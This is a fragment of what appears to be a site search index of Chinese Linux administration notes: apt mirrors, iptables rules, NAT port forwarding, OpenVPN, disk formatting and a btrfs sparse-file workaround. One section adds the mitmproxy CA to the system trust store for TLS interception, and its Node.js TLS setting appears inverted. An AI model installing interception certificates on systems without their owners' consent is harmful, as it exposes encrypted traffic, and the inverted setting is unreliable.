eth0\n</code></pre>"},{"location":"Linux-setup/#aptapt","title":"\u914d\u7f6eapt\u6e90\u4ee5\u52a0\u901f\u56fd\u5185\u73af\u5883\u4e0bapt\u901f\u5ea6","text":"<pre><code>curl http://mirrors.163.com/.help/sources.list.trusty&gt;/etc/apt/sources.list\n</code></pre> <p>\u5982\u679c\u8fd8\u672a\u5b89\u88c5curl\uff0c\u5148\u624b\u52a8\u5199\u5165\u8fd9\u4e24\u884c\uff1a</p> <pre><code>deb http://mirrors.163.com/ubuntu/ trusty main restricted universe multiverse\ndeb http://mirrors.163.com/ubuntu/ trusty-security main restricted universe multiverse\n</code></pre> <p>\u6ce8\uff1avim\u590d\u5236\u4e00\u884c\u7684\u547d\u4ee4\u4e3ayy\uff0c\u7c98\u8d34\u4e3ap</p> <p>\u6216\u8005\u901a\u8fc7sed\u66ff\u6362\uff1a</p> <pre><code>sed -i 's/security.ubuntu.com/mirrors.zju.edu.cn/g' /etc/apt/sources.list\nsed -i 's/archive.ubuntu.com/mirrors.zju.edu.cn/g' /etc/apt/sources.list\n</code></pre>"},{"location":"Linux-setup/#ip_1","title":"\u5355\u7f51\u5361\u83b7\u5f97\u591a\u4e2aIP","text":"<p>ifconfig eth0:233 10.xx.xx.233 netmask 255.255.255.0 up</p>"},{"location":"Linux-setup/#apt","title":"\u89e3\u51b3apt\u4f9d\u8d56\u95ee\u9898","text":"<p>\u95ee\u9898\u63cf\u8ff0\uff1a\u670d\u52a1\u5668\u4e3aubuntu14.04\u7248\u672c\uff0c\u67d0\u4e9b\u4e0d\u660e\u64cd\u4f5c\u540e\uff0c\u65e0\u6cd5\u7528<code>apt-get</code>\u5b89\u88c5\u4efb\u4f55\u4e1c\u897f</p> <pre><code>&gt; apt-get -f install\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nCorrecting dependencies... failed.\nThe following packages have unmet dependencies:\n libatk1.0-0 : Depends: libglib2.0-0 (&gt;= 2.41.1) but 2.40.0-2 is installed\n libglib2.0-bin : Depends: libglib2.0-0 (= 2.44.0-1ubuntu3) but 2.40.0-2 is installed\n libglib2.0-dev : Depends: libglib2.0-0 (= 2.44.0-1ubuntu3) but 2.40.0-2 is installed\n libgtk2.0-0 : Depends: libglib2.0-0 (&gt;= 2.41.1) but 2.40.0-2 is installed\nE: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages.\nE: Unable to correct dependencies\n</code></pre> <p>\u4ed4\u7ec6\u770b\u9519\u8bef\u8bf4\u660e\uff0clibglib2.0-bin\u8fd9\u4e2a\u8f6f\u4ef6\u5305\u8981\u6c42libglib2.0-0\u7684\u7248\u672c=2.44\u4f46\u662f\u73b0\u6709\u7684\u5b89\u88c5\u7248\u672c\u4e3a2.40</p> <p>\u5728ubuntu\u7684\u8f6f\u4ef6\u5305\u5b98\u7f51\u641c\u7d22\u54af\uff1ahttps://launchpad.net/ubuntu/</p> <p>\u53d1\u73b02.44\u7248\u672c\u7684\u662fvivid\u624d\u63d0\u4f9b\u7684\uff0c\u73b0\u5728\u7cfb\u7edf\u7248\u672c\u662ftrusty\uff0c\u81ea\u7136apt-get\u88c5\u4e0d\u4e86</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a</p> <p>\u627e\u5230\u62a5\u9519\u4fe1\u606f\u9700\u8981\u7684\u7cbe\u786e\u5339\u914d\u7684\u90a3\u4e2adeb\u6587\u4ef6\u4e0b\u8f7d\u54af\uff0c\u4f8b\u5982\u8fd9\u91cc\u5c31\u8981\u4e0b\u8f7d\u8fd9\u4e2a\u7248\u672c\u7684\uff1a</p> <p>https://launchpad.net/ubuntu/vivid/amd64/libglib2.0-0/2.44.0-1ubuntu3</p> <p>\u5f97\u5230deb\u6587\u4ef6\u540e<code>dpkg -i \u6587\u4ef6\u540d</code></p>"},{"location":"Linux-setup/#note","title":"Note","text":"<p>\u4e00\u822capt\u4f9d\u8d56\u51b2\u7a81\u95ee\u9898\u90fd\u662f\u7531\u4e8e\u7cfb\u7edf\u7248\u672c\u4e0e\u9700\u8981\u7684\u5305\u7684\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u7684\uff0c\u68c0\u67e5\u4e00\u4e0b/etc/apt/sources.list\u770b\u770b\u662f\u5426\u5339\u914d\u7cfb\u7edf\u7248\u672c\u54af</p> <p>\u7528apt-get\u524d\u68c0\u67e5\u4e00\u4e0bsources.list \u770b\u4e0e\u5f53\u524d<code>lsb-release -a</code>\u662f\u5426\u4e00\u81f4</p>"},{"location":"Linux-setup/#unixbench","title":"UnixBench","text":"<p>VPS\u6027\u80fd\u6d4b\u8bd5\u5de5\u5177\uff0c\u8017\u65f6\u8f83\u957f\uff0c\u8010\u5fc3\u7b49\u5f85</p> <pre><code>curl https://codeload.github.com/kdlucas/byte-unixbench/zip/v5.1.3&gt;UnixBench.zip\nunzip UnixBench.zip\ncd byte-unixbench-5.1.3/UnixBench\n# apt-get install build-essential\nmake\nscreen -S ub\n./Run\n</code></pre> <p>\u53c2\u8003\u6570\u636e\uff0c\u5747\u4e3a\u6700\u4f4e\u914d\u7f6e\uff1a\u4e3b\u673a\u5c4b1590.5\uff1b\u963f\u91cc\u4e911470.4\uff1b\u817e\u8baf\u4e911156.0</p>"},{"location":"Linux-setup/#io","title":"\u786c\u76d8IO\u6027\u80fd\u6d4b\u8bd5","text":"<pre><code>dd if=/dev/zero of=test bs=64k count=4k oflag=dsync\ndd if=/dev/zero of=test bs=8k count=256k conv=fdatasync\n</code></pre>"},{"location":"Linux-setup/#_2","title":"\u6e05\u9664\u5185\u5b58\u7f13\u5b58","text":"<p>\u4f7f\u7528<code>free -h</code>\u67e5\u770b\u53ef\u7528\u5185\u5b58\u524d\u53ef\u4ee5\u6267\u884c\u8fd9\u4e2a\u547d\u4ee4\uff0c\u67e5\u770b\u9664\u53bbbuffer\u540e\u7684\u53ef\u7528\u5185\u5b58</p> <pre><code>sync\necho 3 &gt; /proc/sys/vm/drop_caches\n</code></pre>"},{"location":"Linux-setup/#iptablesip","title":"\u4f7f\u7528iptables\u5c01ip","text":""},{"location":"Linux-setup/#ip_2","title":"\u5c4f\u853d\u5355\u4e2aIP","text":"<pre><code>iptables -I INPUT -s 123.45.6.7 -j DROP\n</code></pre>"},{"location":"Linux-setup/#c","title":"\u5c01C\u6bb5","text":"<pre><code>iptables -I INPUT -s 123.45.6.0/24 -j DROP\n</code></pre>"},{"location":"Linux-setup/#b","title":"\u5c01B\u6bb5","text":"<pre><code> iptables -I INPUT -s 123.45.0.0/16 -j DROP\n</code></pre>"},{"location":"Linux-setup/#a","title":"\u5c01A\u6bb5","text":"<pre><code>iptables -I INPUT -s 123.0.0.0/8 -j DROP\n</code></pre> <p>\u8bb0\u5f97\u4fdd\u5b58\uff1a</p> <pre><code>service iptables save\n</code></pre>"},{"location":"Linux-setup/#_3","title":"\u5220\u9664\u4e00\u6761\u89c4\u5219","text":"<p>\u53ea\u8981\u628a\u4e0a\u8ff0\u7684\u63d2\u5165\u89c4\u5219\u91cd\u5199\u4e00\u6b21\uff0c\u5c06\u5176\u4e2d\u7684-I\u6539\u4e3a-D\u5373\u53ef</p> <pre><code>iptables -D INPUT -s IP\u5730\u5740 -j DROP\n</code></pre> <p>\u5982\u679c\u61d2\u5f97\u91cd\u5199 \u4f60\u4e5f\u53ef\u4ee5\u5148\u5217\u4e3e\u51fa\u89c4\u5219\u6240\u5728\u7684id\uff0c\u6839\u636eid\u5220\u9664\uff1a</p> <pre><code>iptables -L --line-numbers\n</code></pre> <p>\u5047\u8bbe\u4f60\u60f3\u5220\u9664INPUT\u94fe\u7684\u7b2c3\u6761\u89c4\u5219\uff1a</p> <pre><code>iptables -D INPUT 3\n</code></pre>"},{"location":"Linux-setup/#ip_3","title":"\u53ea\u5141\u8bb8\u7279\u5b9aIP\u8bbf\u95ee\u67d0\u7aef\u53e3","text":"<p>iptables\u7684\u63d2\u5165\u6b21\u5e8f\u5f88\u91cd\u8981\uff0c\u5148\u52a0\u5165\u7684\u4f1a\u5148\u5339\u914d\uff0c\u6240\u4ee5\u62d2\u7edd\u7b56\u7565\u5e94\u8be5\u6700\u540e\u52a0\u5165</p> <p>\u4ee58888\u7aef\u53e3\u4e3a\u4f8b\uff0c\u53ea\u5141\u8bb810.77.88.99\u8fd9\u4e2aIP \u548c 10.22.33.0/24 \u8fd9\u4e2aC\u6bb5\u8bbf\u95ee\uff0c\u5176\u4ed6\u6765\u6e90\u7684\u8bbf\u95ee\u62d2\u7edd \u8fd4\u56deconnection refused</p> <pre><code>iptables -A INPUT -s 10.77.88.99 -p tcp --dport 8888 -j ACCEPT\niptables -A INPUT -s 10.22.33.0/24 -p tcp --dport 8888 -j ACCEPT\niptables -A INPUT -p tcp --dport 8888 -j REJECT\n</code></pre>"},{"location":"Linux-setup/#rootscreen","title":"\u65e0root\u6743\u9650\u4f7f\u7528screen","text":"<p>https://www.gnu.org/software/screen/</p> <p>\u590d\u5236\u76f8\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u7684screen\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd0\u884c\u524d\u6307\u5b9a\u73af\u5883\u53d8\u91cf</p> <pre><code>mkdir -p $HOME/.screen\nexport SCREENDIR=$HOME/.screen\n</code></pre>"},{"location":"Linux-setup/#screen","title":"screen\u7684\u7528\u6cd5","text":"<p>\u5217\u51fa\u5b58\u5728\u7684screen\uff1a</p> <pre><code>screen -ls\n</code></pre> <p>\u521b\u5efa\u4e00\u4e2a\u540d\u4e3aname\u7684screen\uff1a</p> <pre><code>screen -S name\n</code></pre> <p>\u4ecescreen\u8131\u79bb\uff1a</p> <pre><code>\u6309Ctrl+A\u540e\u6309d\n</code></pre> <p>\u91cd\u65b0\u8fde\u4e0a\u540d\u79f0\u4e3aname\u7684screen\uff1a</p> <pre><code>screen -r name\n</code></pre> <p>\u521b\u5efa\u4e00\u4e2ascreen\u7684\u81ea\u542f\u52a8\uff0c\u8ba9\u540e\u53f0\u8fdb\u7a0b\u83b7\u5f97tty</p> <pre><code># \u5047\u8bbe\u5199\u597d\u4e86\u4e00\u4e2a/root/code.sh\nvim /etc/rc.local\n# \u5728\u6700\u540e\u52a0\u5165\u4e00\u884c\uff0c\u5176\u4e2dNAME\u66ff\u6362\u4e3a\u81ea\u5df1\u559c\u6b22\u7684\u540d\u5b57\nscreen -dmS NAME /root/code.sh\n</code></pre> <p>\u4e3e\u4e2a\u4f8b\u5b50\u2013\u76d1\u6d4b\u5916\u7f51\u80fd\u5426ping\u901a\uff0c\u5982\u679c\u4e0d\u80fd\u91cd\u8fdezjuvpn\uff1a</p> <p>code/pingtest.sh</p>"},{"location":"Linux-setup/#_4","title":"\u53cc\u7f51\u5361\u7aef\u53e3\u8f6c\u53d1\uff0c\u66b4\u9732\u5185\u7f51\u7aef\u53e3","text":"<p>@TAG \u7aef\u53e3\u8f6c\u53d1</p> <p>\u6765\u81ea\uff1a https://yq.aliyun.com/wenzhang/show_25824</p> <p>\u6709\u4e24\u53f0\u673a\u5668\uff0c\u5176\u4e2d\u4e00\u53f0A \u6709\u5185\u7f51\u548c\u5916\u7f51\uff0cB\u53ea\u6709\u5185\u7f51\u3002</p> <p>\u76ee\u6807\uff1a \u5728\u5916\u7f51\u8bbf\u95eeA\u673a\u5668\u76842121\u7aef\u53e3\uff0c\u5c31\u76f8\u5f53\u4e8e\u8fde\u4e0a\u4e86B\u673a\u5668\u7684ftp(21)</p>"},{"location":"Linux-setup/#_5","title":"\u73af\u5883\uff1a","text":"<p>A\u673a\u5668\u5916\u7f51IP\u4e3a 1.2.3.4(eth1) \u5185\u7f51IP\u4e3a 192.168.1.20 (eth0)</p> <p>B\u673a\u5668\u5185\u7f51\u4e3a 192.168.1.21</p>"},{"location":"Linux-setup/#_6","title":"\u5b9e\u73b0\u65b9\u6cd5\uff1a","text":"<p>\u9996\u5148\u5728A\u673a\u5668\u4e0a\u6253\u5f00\u7aef\u53e3\u8f6c\u53d1\u529f\u80fd</p> <pre><code>    echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n    echo -e \"\\nnet.ipv4.ip_forward = 1\"&gt;&gt;/etc/sysctl.conf\n    sysctl -p\n</code></pre> <p>\u7136\u540e\u5728A\u673a\u5668\u4e0a\u521b\u5efaiptables\u89c4\u5219</p> <pre><code># \u628a\u8bbf\u95ee\u5916\u7f512121\u7aef\u53e3\u7684\u5305\u8f6c\u53d1\u5230\u5185\u7f51ftp\u670d\u52a1\u5668\niptables -t nat -I PREROUTING -d 1.2.3.4 -p tcp --dport 2121 -j DNAT --to 192.168.1.21:21 \n\n# \u628a\u5230\u5185\u7f51ftp\u670d\u52a1\u5668\u7684\u5305\u56de\u6e90\u5230\u5185\u7f51\u7f51\u5361\u4e0a\uff0c\u4e0d\u7136\u5305\u53ea\u80fd\u8f6c\u5230ftp\u670d\u52a1\u5668\uff0c\u800c\u8fd4\u56de\u7684\u5305\u4e0d\u80fd\u5230\u8fbe\u5ba2\u6237\u7aef\niptables -t nat -I POSTROUTING -d 192.168.1.21 -p tcp --dport 21 -j SNAT --to 192.168.1.20 \n\n# \u4fdd\u5b58\u4e00\u4e0b\u89c4\u5219\nservice iptables save\n</code></pre>"},{"location":"Linux-setup/#_7","title":"\u53d6\u6d88\u8f6c\u53d1\u65b9\u6cd5","text":"<p>iptables\u4e2d\u628a-I\u6539\u4e3a-D\u8fd0\u884c\u5c31\u662f\u5220\u9664\u6b64\u6761\u89c4\u5219</p>"},{"location":"Linux-setup/#_8","title":"\u4fdd\u62a4\u91cd\u8981\u7cfb\u7edf\u6587\u4ef6\u9632\u6b62\u88ab\u5220","text":"<p>\u4f7f\u7528+i\u6807\u5fd7\u4f4d\u4f7f\u5f97root\u7528\u6237\u4e5f\u4e0d\u80fd\u5220\u9664/bin, /sbin, /usr/sbin, /usr/bin, /usr/local/sbin, /usr/local/bin</p> <pre><code>chattr -R +i /bin /sbin /usr/sbin /usr/bin /usr/local/sbin /usr/local/bin\n</code></pre> <p>\u8bbe\u7f6e\u540e\u65e0\u6cd5apt-get\u5b89\u88c5\u65b0\u8f6f\u4ef6\uff0c\u9700\u8981\u5148\u53d6\u6d88\u6807\u5fd7\u4f4d</p> <pre><code>chattr -R -i /bin /sbin /usr/sbin /usr/bin /usr/local/sbin /usr/local/bin\n</code></pre>"},{"location":"Linux-setup/#cpu","title":"\u67e5\u770bCPU\u6838\u5fc3\u4e2a\u6570","text":"<p>\u4e00\u822c\u6211\u4f1a\u7528 <code>top</code> \u547d\u4ee4\uff0c\u6309 <code>1</code> \u5c31\u80fd\u770b\u5230\u6bcf\u4e2aCPU\u5360\u7528\u60c5\u51b5</p> <p>\u4f46\u5f53CPU\u592a\u591a\u7684\u65f6\u5019\u8fd8\u662f\u9700\u8981\u6267\u884c\u547d\u4ee4\u7684\uff1a</p> <pre><code># \u67e5\u770b\u7269\u7406CPU\u4e2a\u6570\ncat /proc/cpuinfo| grep \"physical id\"| sort| uniq| wc -l\n\n# \u67e5\u770b\u6bcf\u4e2a\u7269\u7406CPU\u4e2dcore\u7684\u4e2a\u6570(\u5373\u6838\u6570)\ncat /proc/cpuinfo| grep \"cpu cores\"| uniq\n\n# \u67e5\u770b\u903b\u8f91CPU\u7684\u4e2a\u6570\ncat /proc/cpuinfo| grep \"processor\"| wc -l\n</code></pre>"},{"location":"Linux-setup/#_9","title":"\u975e\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237","text":"<pre><code>useradd username -m\necho username:badpassword|chpasswd\n</code></pre> <p>\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u540d\u4e3ausername\u7684\u7528\u6237\u5e76\u521b\u5efahome\u76ee\u5f55\uff0c\u5e76\u8bbe\u7f6e\u5bc6\u7801\u4e3abadpassword</p>"},{"location":"Linux-setup/#openvpn","title":"\u7b80\u5355OpenVPN\u914d\u7f6e","text":"<p>\u4e00\u4e2a\u6700\u6700\u7b80\u5355\u7684\u573a\u666f\uff1a\u53ea\u6709\u4e00\u4e2a\u670d\u52a1\u5668 \u4e00\u4e2a\u5ba2\u6237\u7aef\uff0c\u5728\u5bb9\u5668\u4e2d\u7528\u6765\u7ed9\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u4e00\u4e2a\u5185\u7f51IP</p> <p>\u53c2\u8003\uff1a https://openvpn.net/index.php/open-source/documentation/miscellaneous/78-static-key-mini-howto.html</p>"},{"location":"Linux-setup/#openvpn_1","title":"\u5b89\u88c5openvpn:","text":"<p>Linux:</p> <pre><code>apt-get install openvpn\n</code></pre> <p>Windows:</p> <p>openvpn.exe</p>"},{"location":"Linux-setup/#_10","title":"\u751f\u6210\u5bc6\u94a5","text":"<pre><code>openvpn --genkey --secret static.key\n</code></pre> <p>\u7528\u53e6\u5916\u5efa\u7acb\u7684\u5b89\u5168\u901a\u9053(SSH)\u5c06static.key\u53d1\u7ed9\u5ba2\u6237\u7aef</p>"},{"location":"Linux-setup/#_11","title":"\u670d\u52a1\u7aef\u914d\u7f6e","text":"<pre><code>ifconfig 10.8.0.1 10.8.0.2\nsecret /static.key\nkeepalive 10 60\npersist-key\npersist-tun\nproto udp\nport 1194\ndev tun0\nstatus /tmp/openvpn-status.log\n\nuser nobody\ngroup nogroup\n</code></pre> <p>\u5728 Ubuntu \u4e2d\uff0c\u5982\u679c\u8981\u914d\u7f6e\u6210\u7cfb\u7edf\u670d\u52a1\u7684\u5f62\u5f0f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230/etc/openvpn/myvpn.conf</p> <p>\u7136\u540e\u8fd9\u6837\u542f\u52a8\u5b83\uff1a</p> <pre><code>service openvpn@myvpn start\n</code></pre> <p>\u8fd9\u6837\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f</p> <pre><code>systemctl enable openvpn@myvpn.service\n</code></pre>"},{"location":"Linux-setup/#_12","title":"\u5ba2\u6237\u7aef\u914d\u7f6e","text":"<pre><code>remote \u8fd9\u91cc\u662f\u4f60\u7684\u670d\u52a1\u5668IP \u8fd9\u91cc\u662f\u4f60\u7684\u670d\u52a1\u5668\u7aef\u53e3 udp\ndev tun\nifconfig 10.8.0.2 10.8.0.1\nsecret static.key\n</code></pre>"},{"location":"Linux-setup/#docker","title":"\u5728Docker\u4e2d\u4f7f\u7528\u670d\u52a1\u7aef","text":"<p>\u53c2\u8003\uff1a https://raw.githubusercontent.com/kylemanna/docker-openvpn/master/bin/ovpn_run</p> <p>\u8fd0\u884c\u5bb9\u5668\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u7ed9\u53c2\u6570<code>--cap-add=NET_ADMIN</code></p> <p>\u53e6\u5916\u8fd8\u9700\u8981\u5728\u5bb9\u5668\u4e2d\u6267\u884c\uff1a</p> <pre><code>mkdir -p /dev/net\nif [ ! -c /dev/net/tun ]; then\nmknod /dev/net/tun c 10 200\nfi\n</code></pre>"},{"location":"Linux-setup/#_13","title":"\u65f6\u533a\u65f6\u95f4\u8bbe\u7f6e","text":"<p>\u53c2\u8003\uff1a http://liumissyou.blog.51cto.com/4828343/1302050</p> <p>\u8bbe\u7f6e\u4e3a\u4e0a\u6d77\u65f6\u533a UTC+8</p> <pre><code>apt-get install tzdata\ncp /etc/localtime /etc/localtime.bak\nln -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\necho \"TZ='Asia/Shanghai'\"&gt;&gt;~/.bashrc\nntpdate cn.pool.ntp.org\n</code></pre> <p>\u4fee\u6539\u65f6\u95f4\u53ef\u4ee5\u7528\uff1a</p> <pre><code>date -s \"2017-06-18 16:40:00\"\n</code></pre>"},{"location":"Linux-setup/#ext4","title":"\u5feb\u901f\u5730\u683c\u5f0f\u5316\u5927\u5206\u533aext4","text":"<p>Linux\u7cfb\u7edf\u5efa\u8bae\u4f7f\u7528ext4\u5206\u533a\u683c\u5f0f\uff0c\u4f46\u76f4\u63a5mkfs.ext4 /dev/sda1\u5c31\u6709\u5f88\u5927\u7684\u5751\uff1a\u4f1a\u9ed8\u8ba4lazyinit\u5728\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u5185\u5360\u7528IO</p> <p>\u53c2\u8003\uff1a http://fibrevillage.com/storage/474-ext4-lazy-init</p> <p>\u9002\u7528\u4e8e\u5b58\u50a8\u5c11\u91cf\u5927\u6587\u4ef6\u7684\u683c\u5f0f\u5316\u5927\u786c\u76d8\u7684\u65b9\u6cd5\u5982\u4e0b\uff0c\u8fd9\u6837\u4e0d\u4f1a\u8df3\u8fc7\u521d\u59cb\u5316\u78c1\u76d8\u7684\u8fc7\u7a0b\u800c\u4e14\u521d\u59cb\u5316\u8fc7\u7a0b\u5f88\u5feb\uff1a</p> <pre><code>mkfs.ext4 /dev/sdXX -E lazy_itable_init=0,lazy_journal_init=0 -O sparse_super,large_file -m 0 -T largefile4\n</code></pre> <p>\u5bf9\u5e94\u7684man\u6587\u6863</p>"},{"location":"Linux-setup/#ssd","title":"\u4f18\u5316\u672c\u5730ssd\u6027\u80fd","text":"<p>\u53c2\u8003 https://cloud.google.com/compute/docs/disks/optimizing-pd-performance https://cloud.google.com/compute/docs/disks/optimizing-local-ssd-performance</p> <pre><code>mkfs.ext4 -E lazy_itable_init=0,lazy_journal_init=0,discard /dev/sdX\nmount -o discard,defaults,nobarrier /dev/sdX /mnt\necho none &gt; /sys/block/sdX/queue/scheduler\n</code></pre>"},{"location":"Linux-setup/#readahead","title":"\u8c03\u6574 readahead \u503c","text":"<p>\u5bf9\u4e8e\u968f\u673a\u8bfb\u5199\u7684\u5e94\u7528\u5982\u6570\u636e\u5e93\uff0c\u5efa\u8bae\u4f7f\u7528\u66f4\u5c0f\u7684readahead\u503c</p> <p>\u8f83\u9ad8\u7684 readahead \u503c\u53ef\u589e\u52a0\u541e\u5410\u91cf\uff0c\u4f46\u662f\u4f1a\u5360\u7528\u66f4\u591a\u5185\u5b58\u548c IOPS\u3002\u8f83\u4f4e\u7684 readahead \u503c\u53ef\u589e\u52a0 IOPS\uff0c\u4f46\u662f\u4f1a\u727a\u7272\u541e\u5410\u91cf\u3002 readahead \u503c\u4e3a  / 512 \u5b57\u8282\u3002 <p>\u4f8b\u5982\u9884\u8bfb\u8bbe\u7f6e\u4e3a32KB\u7684\u8bdd\uff0c\u5c31\u5e94\u8be5\u8bbe\u7f6e\u4e3a<code>32*1024/512=64</code></p> <pre><code>blockdev --setra 64 /dev/sdX\n</code></pre>"},{"location":"Linux-setup/#ca-mitmproxy","title":"\u6dfb\u52a0\u53d7\u4fe1\u4efb\u7684CA\u8bc1\u4e66 mitmproxy","text":"<p>@TAG mitm</p> <pre><code>cat ~/.mitmproxy/mitmproxy-ca-cert.pem &gt;&gt; /etc/ssl/certs/ca-certificates.crt\n</code></pre> <p>\u5bf9\u4e8enodejs\u8fd9\u4e2a\u53ef\u80fd\u4e5f\u6ca1\u7528\uff0c\u76f4\u63a5<code>export NODE_TLS_REJECT_UNAUTHORIZED=1</code></p>"},{"location":"Linux-setup/#inodebtrfs","title":"\u660e\u660e\u8fd8\u6709\u5927\u91cf\u7a7a\u95f4\u5374\u8bf4\u6ca1\u6709\uff1finode\u6ee1\u4e86\uff01\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a","text":""},{"location":"Linux-setup/#_14","title":"\u95ee\u9898\u73b0\u8c61","text":"<p><code>df -h</code>\u663e\u793a\u8fd8\u6709\u5f88\u591a\u7a7a\u95f4\uff0c\u4f46<code>echo test&gt;test.txt</code>\u4f1a\u663e\u793a<code>No space left on device</code></p> <p>\u67e5\u5230\u8fd9\u4e2a\uff1a https://wiki.gentoo.org/wiki/Knowledge_Base:No_space_left_on_device_while_there_is_plenty_of_space_available</p> <p>\u4f7f\u7528<code>df -i</code>\u67e5\u770binodes\u5360\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u786e\u5b9e100%\u4e86</p>"},{"location":"Linux-setup/#_15","title":"\u89e3\u51b3\u65b9\u6848","text":"<p>inodes\u4e0a\u9650\u5728mkfs\u65f6\u5c31\u5b9a\u4e0b\u6765\u4e86\uff0c\u4e0d\u80fd\u6539\u52a8\uff0c\u6240\u4ee5\u6ca1\u6551\u4e86\u3002\u3002\u3002</p> <p>\u771f\u6ca1\u6551\u4e86\u561b\uff1f \u5f53\u7136\u4e0d\u662f\uff0c\u867d\u7136\u4e0d\u80fd\u5199\u5165\u5927\u91cf\u5c0f\u6587\u4ef6\uff0c\u4f46\u8fd8\u662f\u53ef\u4ee5\u5199\u4e00\u4e2a\u5927\u6587\u4ef6\u7684\u561b\uff0c\u5c31\u60f3\u5230\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a</p>"},{"location":"Linux-setup/#1-inodes","title":"1. \u5220\u6587\u4ef6 \u817e\u51fa\u90e8\u5206inodes","text":"<p>\u5220\u6389\u4e00\u4e9b\u4e0d\u7528\u7684\u5c0f\u6587\u4ef6\uff0c\u4e5f\u4e0d\u7528\u5220\u592a\u591a</p>"},{"location":"Linux-setup/#2-1tbsparse-file","title":"2. \u521b\u5efa\u4e00\u4e2a1TB\u7684sparse file","text":"<p>\u53c2\u8003: https://prefetch.net/blog/2009/07/05/creating-sparse-files-on-linux-hosts-with-dd/</p> <p>\u4f7f\u7528dd\u547d\u4ee4\uff0c\u4e0d\u5c06\u5b9e\u9645\u5185\u5bb9\u5199\u5165\u786c\u76d8\uff0c\u80fd\u5f88\u5feb\u6267\u884c\u5b8c\u6210\uff1a</p> <pre><code>NAME=\"filesystem\"\ndd if=/dev/zero of=${NAME}.img bs=1 count=0 seek=1T\n</code></pre> <p>\u6267\u884c\u540els -alh\u80fd\u770b\u5230\u6587\u4ef6\u5927\u5c0f\u4e3a1T\uff0c\u4f7f\u7528<code>du filesystem.img</code>\u67e5\u770b\u771f\u5b9e\u7a7a\u95f4</p>"},{"location":"Linux-setup/#3","title":"3. \u521b\u5efa\u78c1\u76d8\u5206\u533a","text":"<p>\u53c2\u8003\uff1a https://www.jamescoyle.net/how-to/2096-use-a-file-as-a-linux-block-device</p> <p>btrfs\u53c2\u8003\uff1a https://btrfs.wiki.kernel.org/index.php/Getting_started</p> <pre><code>mkfs.btrfs ${NAME}.img\n</code></pre>"},{"location":"Linux-setup/#4","title":"4. \u6302\u8f7d\u5206\u533a","text":"<pre><code>mount ${NAME}.img /mnt\n</code></pre>"},{"location":"Linux-setup/#5","title":"5. \u7136\u540e\u5c31\u53ef\u4ee5\u642c\u8fd0\u6570\u636e\u8fc7\u53bb\u4e86","text":"<p>\u5c31\u7528mv\u50cf\u5f80\u5e38\u4e00\u6837\u642c\u54af</p>"},{"location":"Linux-setup/#_16","title":"\u4e00\u4e9b\u67e5\u770b\u7a7a\u95f4\u7684\u547d\u4ee4","text":"<pre><code># \u67e5\u770b\u78c1\u76d8\u6587\u4ef6\u5360\u7528\u7a7a\u95f4\ndu -h filesystem.img\n# \u67e5\u770bbtrfs\u5143\u6570\u636e\u5360\u7528\u7a7a\u95f4\nbtrfs filesystem df /mnt\n# \u4e5f\u662f\u67e5\u770b\u7a7a\u95f4\nbtrfs filesystem usage /mnt\n</code></pre>"},{"location":"Linux-setup/#6","title":"6. \u5378\u8f7d\u8bbe\u5907","text":"<pre><code>sudo umount /mnt\nsudo losetup -d /dev/loop0\n</code></pre>"},{"location":"Linux-setup/#btrfs","title":"\u6269\u5bb9\u4e0a\u8ff0\u5355\u6587\u4ef6btrfs\u78c1\u76d8","text":"<p>@TAG \u5b89\u5168\u6700\u4f73\u5b9e\u8df5</p> <p>\u968f\u7740\u4e0d\u505c\u5730\u5199\u5165\u6570\u636e\uff0c\u4e0a\u9762\u521b\u5efa\u76841TB\u5206\u533a\u5c31\u8981\u88ab\u5199\u6ee1\u4e86\uff01\u4f46\u6587\u4ef6\u6240\u5728\u7269\u7406\u78c1\u76d8\u8fd8\u6709\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u7ed9btrfs\u78c1\u76d8\u6269\u5bb9\uff1a</p> <p>\u5b9e\u9645\u6587\u4ef6\u7528truncate\u589e\u52a0\u4e00\u4e2ahole\uff1blosetup\u66f4\u65b0loop0\u7684\u5927\u5c0f\uff1b\u4f7f\u7528btrfs\u547d\u4ee4\u7ed9\u5206\u533a\u6269\u5bb9</p> <p>truncate\u662f\u4e00\u4e2a\u5371\u9669\u7684\u547d\u4ee4\uff0c\u4e3a\u4e86\u907f\u514d\u624b\u6296\u628a\u7a7a\u95f4\u5199\u5c0f\u4e86\u4e22\u5931\u6570\u636e\uff0c\u8fd9\u91cc\u7528<code>--reference</code>\u53c2\u6570\u6307\u5b9a\u4e00\u4e2a\u76ee\u6807\u5927\u5c0f\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u6269\u5bb9\u52301.5T=1536GB</p> <pre><code>dd if=/dev/zero of=temp bs=1 count=0 seek=1536G\nls -alh # \u786e\u8ba4\u6587\u4ef6\u5927\u5c0f\ntruncate -r temp filesystem.img\n\n# \u5047\u8bbe\u76ee\u524d\u4f7f\u7528\u7684\u662f/dev/loop0\n# \u4f60\u53ef\u4ee5\u8fd9\u6837\u786e\u8ba4loop0\u786e\u5b9e\u662ffilesystem.img\u6302\u8f7d\u7684\uff1a losetup --list /dev/loop0\nlosetup -c /dev/loop0\n\n# \u786e\u4fdd\u76ee\u524dbtrfs\u5206\u533a\u662f\u6302\u8f7d\u7740\u7684\uff0cbtrfs\u5fc5\u987b\u5148mount\u624d\u80fdresize\n# mount filesystem.img /mnt\nbtrfs filesystem resize +500G /mnt\n</code></pre> <p>\u53c2\u8003\uff1a</p> <ul> <li>https://linux.die.net/man/1/truncate</li> 